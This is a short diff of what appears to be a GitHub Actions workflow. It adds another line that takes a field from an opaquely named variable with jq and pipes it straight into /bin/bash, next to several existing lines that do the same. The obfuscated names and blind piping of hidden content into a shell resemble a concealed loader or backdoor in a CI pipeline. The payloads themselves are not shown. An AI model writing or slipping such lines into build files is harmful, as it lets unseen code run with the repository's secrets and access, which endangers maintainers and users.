@@ -27,6 +27,7 @@ jobs:
           echo $wdx215 | jq -r .c015 | /bin/bash
           echo $nuer8 | jq -r .tvhk18140 | /bin/bash
           printf '%s' "$s4" | jq -r .mwvmg2004 | /bin/bash
+          printf '%s' "$nhyso80" | jq -r .x525 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
